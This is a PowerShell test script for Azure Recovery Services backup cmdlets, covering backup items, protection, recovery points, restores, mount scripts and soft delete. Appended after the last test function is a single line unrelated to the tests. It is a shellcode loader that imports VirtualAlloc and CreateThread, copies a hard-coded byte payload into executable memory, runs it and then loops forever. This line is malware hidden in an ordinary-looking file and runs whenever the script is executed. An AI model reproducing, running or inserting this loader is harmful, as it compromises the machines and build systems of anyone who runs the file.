













function Test-AzureVMGetItems
{
	$location = Get-ResourceGroupLocation
	$resourceGroupName = Create-ResourceGroup $location

	try
	{
		
		$vm = Create-VM $resourceGroupName $location 1
		$vm2 = Create-VM $resourceGroupName $location 12
		$vault = Create-RecoveryServicesVault $resourceGroupName $location
		Enable-Protection $vault $vm
		Enable-Protection $vault $vm2
		$policy = Get-AzRecoveryServicesBackupProtectionPolicy `
			-VaultId $vault.ID `
			-Name "DefaultPolicy"

		$container = Get-AzRecoveryServicesBackupContainer `
			-VaultId $vault.ID `
			-ContainerType AzureVM `
			-Status Registered `
			-FriendlyName $vm.Name
		
		
		$items = Get-AzRecoveryServicesBackupItem `
			-VaultId $vault.ID `
			-Container $container `
			-WorkloadType AzureVM;
		Assert-True { $items.VirtualMachineId -contains $vm.Id }

		
		
		$items = Get-AzRecoveryServicesBackupItem `
			-VaultId $vault.ID `
			-Container $container `
			-WorkloadType AzureVM `
			-Name $vm.Name;
		Assert-True { $items.Count -eq 1 }
		Assert-True { $items.VirtualMachineId -contains $vm.Id }
		Assert-NotNull $items[0].LastBackupTime

		
		$items = Get-AzRecoveryServicesBackupItem `
			-VaultId $vault.ID `
			-Container $container `
			-WorkloadType AzureVM `
			-ProtectionStatus Healthy;
		Assert-True { $items.VirtualMachineId -contains $vm.Id }

		
		$items = Get-AzRecoveryServicesBackupItem `
			-VaultId $vault.ID `
			-Container $container `
			-WorkloadType AzureVM `
			-ProtectionState IRPending;
		Assert-True { $items.VirtualMachineId -contains $vm.Id }

		
		$items = Get-AzRecoveryServicesBackupItem `
			-VaultId $vault.ID `
			-Container $container `
			-WorkloadType AzureVM `
			-Name $vm.Name `
			-ProtectionStatus Healthy;
		Assert-True { $items.VirtualMachineId -contains $vm.Id }

		
		$items = Get-AzRecoveryServicesBackupItem `
			-VaultId $vault.ID `
			-Container $container `
			-WorkloadType AzureVM `
			-Name $vm.Name `
			-ProtectionState IRPending;
		Assert-True { $items.VirtualMachineId -contains $vm.Id }

		
		$items = Get-AzRecoveryServicesBackupItem `
			-VaultId $vault.ID `
			-Container $container `
			-WorkloadType AzureVM `
			-ProtectionState IRPending `
			-ProtectionStatus Healthy;
		Assert-True { $items.VirtualMachineId -contains $vm.Id }

		
		$items = Get-AzRecoveryServicesBackupItem `
			-VaultId $vault.ID `
			-Container $container `
			-WorkloadType AzureVM `
			-Name $vm.Name `
			-ProtectionState IRPending `
			-ProtectionStatus Healthy;
		Assert-True { $items.VirtualMachineId -contains $vm.Id }

		
		$items = Get-AzRecoveryServicesBackupItem `
			-VaultId $vault.ID `
			-Policy $policy;
		Assert-True { $items.VirtualMachineId -contains $vm.Id }
	}
	finally
	{
		
		Cleanup-ResourceGroup $resourceGroupName
	}
}

function Test-AzureVMProtection
{
	$location = Get-ResourceGroupLocation
	$resourceGroupName = Create-ResourceGroup $location

	try
	{
		
		$vm = Create-VM $resourceGroupName $location
		$vault = Create-RecoveryServicesVault $resourceGroupName $location

		
        Start-TestSleep 5000

		
		$policy = Get-AzRecoveryServicesBackupProtectionPolicy `
			-VaultId $vault.ID `
			-Name "DefaultPolicy";
	
		
		Enable-AzRecoveryServicesBackupProtection `
			-VaultId $vault.ID `
			-Policy $policy `
			-Name $vm.Name `
			-ResourceGroupName $vm.ResourceGroupName;

		$policy = Get-AzRecoveryServicesBackupProtectionPolicy `
			-VaultId $vault.ID `
			-Name "DefaultPolicy";

		Assert-True {$policy.ProtectedItemsCount -eq 1};

		$container = Get-AzRecoveryServicesBackupContainer `
			-VaultId $vault.ID `
			-ContainerType AzureVM `
			-Status Registered;

		$item = Get-AzRecoveryServicesBackupItem `
			-VaultId $vault.ID `
			-Container $container `
			-WorkloadType AzureVM

		
		Disable-AzRecoveryServicesBackupProtection `
			-VaultId $vault.ID `
			-Item $item `
			-RemoveRecoveryPoints `
			-Force;
		
		$policy = Get-AzRecoveryServicesBackupProtectionPolicy `
			-VaultId $vault.ID `
			-Name "DefaultPolicy";

		Assert-True {$policy.ProtectedItemsCount -eq 0};

	}
	finally
	{
		
		Cleanup-ResourceGroup $resourceGroupName
	}
}

function Test-AzureVMGetRPs
{
	$location = Get-ResourceGroupLocation
	$resourceGroupName = Create-ResourceGroup $location

	try
	{
  		
		$vm = Create-VM $resourceGroupName $location
		$vault = Create-RecoveryServicesVault $resourceGroupName $location
		$item = Enable-Protection $vault $vm
		$backupJob = Backup-Item $vault $item

		
		$backupStartTime = $backupJob.StartTime.AddMinutes(-1);
		$backupEndTime = $backupJob.EndTime.AddMinutes(1);
		$recoveryPoint = Get-AzRecoveryServicesBackupRecoveryPoint `
			-VaultId $vault.ID `
			-StartDate $backupStartTime `
			-EndDate $backupEndTime `
			-Item $item;
	
		Assert-NotNull $recoveryPoint;
		Assert-True { $recoveryPoint.SourceResourceId -match $vm.Id };

		
		$recoveryPointDetail = Get-AzRecoveryServicesBackupRecoveryPoint `
			-VaultId $vault.ID `
			-RecoveryPointId $recoveryPoint[0].RecoveryPointId `
			-Item $item;
	
		Assert-NotNull $recoveryPointDetail;

		
		
		Assert-ThrowsContains { Get-AzRecoveryServicesBackupRecoveryPoint `
			-VaultId $vault.ID `
			-StartDate $backupEndTime `
			-EndDate $backupStartTime `
			-Item $item } `
			"End date should be greater than start date";
		
		
		$backupStartTime1 = Get-QueryDateInUtc $((Get-Date).AddYears(100)) "BackupStartTime1"
        Assert-ThrowsContains { Get-AzRecoveryServicesBackupRecoveryPoint `
			-VaultId $vault.ID `
			-StartDate $backupStartTime1 `
			-Item $item } `
			"Start date\time should be less than current UTC date\time";

		
		$backupStartTime2 = Get-QueryDateLocal $((Get-Date).AddDays(-20)) "BackupStartTime2"
        Assert-ThrowsContains { Get-AzRecoveryServicesBackupRecoveryPoint `
			-VaultId $vault.ID `
			-StartDate $backupStartTime2 `
			-Item $item } `
			"Please specify startdate and enddate in UTC format";
	}
	finally
	{
		
		Cleanup-ResourceGroup $resourceGroupName
	}
}

function Test-AzureVMFullRestore
{
	$location = Get-ResourceGroupLocation
	$resourceGroupName = Create-ResourceGroup $location
	$targetResourceGroupName = Create-ResourceGroup $location 1

	try
	{
		
		$saName = Create-SA $resourceGroupName $location
		$vm = Create-VM $resourceGroupName $location
		$vault = Create-RecoveryServicesVault $resourceGroupName $location
		$item = Enable-Protection $vault $vm
		$backupJob = Backup-Item $vault $item
		$rp = Get-RecoveryPoint $vault $item $backupJob

		Assert-ThrowsContains { Restore-AzRecoveryServicesBackupItem `
			-VaultId $vault.ID `
			-VaultLocation $vault.Location `
			-RecoveryPoint $rp `
			-StorageAccountName $saName `
			-StorageAccountResourceGroupName $resourceGroupName `
			-UseOriginalStorageAccount } `
			"This recovery point doesn’t have the capability to restore disks to their original storage account. Re-run the restore command without the UseOriginalStorageAccountForDisks parameter.";

		$restoreJob1 = Restore-AzRecoveryServicesBackupItem `
			-VaultId $vault.ID `
			-VaultLocation $vault.Location `
			-RecoveryPoint $rp `
			-StorageAccountName $saName `
			-StorageAccountResourceGroupName $resourceGroupName | `
				Wait-AzRecoveryServicesBackupJob -VaultId $vault.ID

		Assert-True { $restoreJob1.Status -eq "Completed" }   

		$restoreJob2 = Restore-AzRecoveryServicesBackupItem `
			-VaultId $vault.ID `
			-VaultLocation $vault.Location `
			-RecoveryPoint $rp `
			-StorageAccountName $saName `
			-StorageAccountResourceGroupName $resourceGroupName `
			-TargetResourceGroupName $targetResourceGroupName | `
				Wait-AzRecoveryServicesBackupJob -VaultId $vault.ID

		Assert-True { $restoreJob2.Status -eq "Completed" }
	}
	finally
	{
		
		Cleanup-ResourceGroup $resourceGroupName
		Cleanup-ResourceGroup $targetResourceGroupName
	}
}

function Test-AzureUnmanagedVMFullRestore
{
	$location = Get-ResourceGroupLocation
	$resourceGroupName = Create-ResourceGroup $location
	
	try
	{
		$saName = Create-SA $resourceGroupName $location
		$vm = Create-UnmanagedVM $resourceGroupName $location $saName
		$vault = Create-RecoveryServicesVault $resourceGroupName $location
		$item = Enable-Protection $vault $vm $resourceGroupName
		$backupJob = Backup-Item $vault $item
		$rp = Get-RecoveryPoint $vault $item $backupJob

		$restoreJob = Restore-AzRecoveryServicesBackupItem `
			-VaultId $vault.ID `
			-VaultLocation $vault.Location `
			-RecoveryPoint $rp `
			-StorageAccountName $saName `
			-StorageAccountResourceGroupName $resourceGroupName `
			-UseOriginalStorageAccount | Wait-AzRecoveryServicesBackupJob -VaultId $vault.ID
		
		Assert-True { $restoreJob.Status -eq "Completed" }
	}
	finally
	{
		Cleanup-ResourceGroup $resourceGroupName
	}
}

function Test-AzureVMRPMountScript
{
	$location = Get-ResourceGroupLocation
	$resourceGroupName = Create-ResourceGroup $location

	try
	{
		
		$vm = Create-VM $resourceGroupName $location
		$vault = Create-RecoveryServicesVault $resourceGroupName $location
		$item = Enable-Protection $vault $vm
		$backupJob = Backup-Item $vault $item
		$rp = Get-RecoveryPoint $vault $item $backupJob

		
		$mountScriptDetails = Get-AzRecoveryServicesBackupRPMountScript `
			-VaultId $vault.ID `
			-RecoveryPoint $rp

		Assert-NotNull $mountScriptDetails.OsType
		Assert-NotNull $mountScriptDetails.Password
		Assert-NotNull $mountScriptDetails.Filename
		Assert-NotNull $mountScriptDetails.FilePath

		Write-Output $mountScriptDetails

		
		Disable-AzRecoveryServicesBackupRPMountScript -VaultId $vault.ID -RecoveryPoint $rp
	}
	finally
	{
		
		Cleanup-ResourceGroup $resourceGroupName
	}
}

function Test-AzureVMBackup
{
	$location = Get-ResourceGroupLocation
	$resourceGroupName = Create-ResourceGroup $location

	try
	{
		
		$vm = Create-VM $resourceGroupName $location
		$vault = Create-RecoveryServicesVault $resourceGroupName $location
		$item = Enable-Protection $vault $vm
		
		
		$backupJob = Backup-AzRecoveryServicesBackupItem `
			-VaultId $vault.ID `
			-Item $item | Wait-AzRecoveryServicesBackupJob -VaultId $vault.ID

		Assert-True { $backupJob.Status -eq "Completed" }
	}
	finally
	{
		
		Cleanup-ResourceGroup $resourceGroupName
	}
}

function Test-AzureVMSetVaultContext
{
	$location = Get-ResourceGroupLocation
	$resourceGroupName = Create-ResourceGroup $location

	try
	{
		
		$vm = Create-VM $resourceGroupName $location
		$vault = Create-RecoveryServicesVault $resourceGroupName $location

		
        Start-TestSleep 5000

		Set-AzRecoveryServicesVaultContext -Vault $vault

		
		$policy = Get-AzRecoveryServicesBackupProtectionPolicy `
			-Name "DefaultPolicy";
	
		
		Enable-AzRecoveryServicesBackupProtection `
			-Policy $policy `
			-Name $vm.Name `
			-ResourceGroupName $vm.ResourceGroupName;

		$container = Get-AzRecoveryServicesBackupContainer `
			-ContainerType AzureVM `
			-Status Registered;

		$item = Get-AzRecoveryServicesBackupItem `
			-Container $container `
			-WorkloadType AzureVM

		
		Disable-AzRecoveryServicesBackupProtection `
			-Item $item `
			-RemoveRecoveryPoints `
			-Force;
	}
	finally
	{
		
		Cleanup-ResourceGroup $resourceGroupName
	}
}

function Test-AzureVMSoftDelete
{
	$location = "southeastasia"
	$resourceGroupName = Create-ResourceGroup $location

	try
	{	
		
		$vm = Create-VM $resourceGroupName $location
		$vault = Create-RecoveryServicesVault $resourceGroupName $location
		Set-AzRecoveryServicesVaultContext -Vault $vault

		$item = Enable-Protection $vault $vm
		$backupJob = Backup-Item $vault $item
		
		
		
		Disable-AzRecoveryServicesBackupProtection `
			-VaultId $vault.ID `
			-Item $item `
			-RemoveRecoveryPoints `
			-Force;

		

		$container = Get-AzRecoveryServicesBackupContainer `
			-VaultId $vault.ID `
			-ContainerType "AzureVM" `
			-FriendlyName $vm.Name;

		$item = Get-AzRecoveryServicesBackupItem `
			-VaultId $vault.ID `
			-Container $container `
			-WorkloadType "AzureVM";

		

		Undo-AzRecoveryServicesBackupItemDeletion `
			-VaultId $vault.ID `
			-Item $item;

		$item = Get-AzRecoveryServicesBackupItem `
			-VaultId $vault.ID `
			-Container $container `
			-WorkloadType "AzureVM";

		
		Assert-True { $item.ProtectionState -eq "ProtectionStopped" }

	}
	finally
	{
		
	}
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xc9,0xf5,0x1a,0x59,0xdb,0xd3,0xd9,0x74,0x24,0xf4,0x5f,0x33,0xc9,0xb1,0x47,0x31,0x47,0x13,0x83,0xef,0xfc,0x03,0x47,0xc6,0x17,0xef,0xa5,0x30,0x55,0x10,0x56,0xc0,0x3a,0x98,0xb3,0xf1,0x7a,0xfe,0xb0,0xa1,0x4a,0x74,0x94,0x4d,0x20,0xd8,0x0d,0xc6,0x44,0xf5,0x22,0x6f,0xe2,0x23,0x0c,0x70,0x5f,0x17,0x0f,0xf2,0xa2,0x44,0xef,0xcb,0x6c,0x99,0xee,0x0c,0x90,0x50,0xa2,0xc5,0xde,0xc7,0x53,0x62,0xaa,0xdb,0xd8,0x38,0x3a,0x5c,0x3c,0x88,0x3d,0x4d,0x93,0x83,0x67,0x4d,0x15,0x40,0x1c,0xc4,0x0d,0x85,0x19,0x9e,0xa6,0x7d,0xd5,0x21,0x6f,0x4c,0x16,0x8d,0x4e,0x61,0xe5,0xcf,0x97,0x45,0x16,0xba,0xe1,0xb6,0xab,0xbd,0x35,0xc5,0x77,0x4b,0xae,0x6d,0xf3,0xeb,0x0a,0x8c,0xd0,0x6a,0xd8,0x82,0x9d,0xf9,0x86,0x86,0x20,0x2d,0xbd,0xb2,0xa9,0xd0,0x12,0x33,0xe9,0xf6,0xb6,0x18,0xa9,0x97,0xef,0xc4,0x1c,0xa7,0xf0,0xa7,0xc1,0x0d,0x7a,0x45,0x15,0x3c,0x21,0x01,0xda,0x0d,0xda,0xd1,0x74,0x05,0xa9,0xe3,0xdb,0xbd,0x25,0x4f,0x93,0x1b,0xb1,0xb0,0x8e,0xdc,0x2d,0x4f,0x31,0x1d,0x67,0x8b,0x65,0x4d,0x1f,0x3a,0x06,0x06,0xdf,0xc3,0xd3,0x89,0x8f,0x6b,0x8c,0x69,0x60,0xcb,0x7c,0x02,0x6a,0xc4,0xa3,0x32,0x95,0x0f,0xcc,0xd9,0x6f,0xc7,0x33,0xb5,0x71,0x1f,0xdc,0xc4,0x71,0x1e,0xa7,0x40,0x97,0x4a,0xc7,0x04,0x0f,0xe2,0x7e,0x0d,0xdb,0x93,0x7f,0x9b,0xa1,0x93,0xf4,0x28,0x55,0x5d,0xfd,0x45,0x45,0x09,0x0d,0x10,0x37,0x9f,0x12,0x8e,0x52,0x1f,0x87,0x35,0xf5,0x48,0x3f,0x34,0x20,0xbe,0xe0,0xc7,0x07,0xb5,0x29,0x52,0xe8,0xa1,0x55,0xb2,0xe8,0x31,0x00,0xd8,0xe8,0x59,0xf4,0xb8,0xba,0x7c,0xfb,0x14,0xaf,0x2d,0x6e,0x97,0x86,0x82,0x39,0xff,0x24,0xfd,0x0e,0xa0,0xd7,0x28,0x8f,0x9c,0x01,0x14,0xe5,0xcc,0x91;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

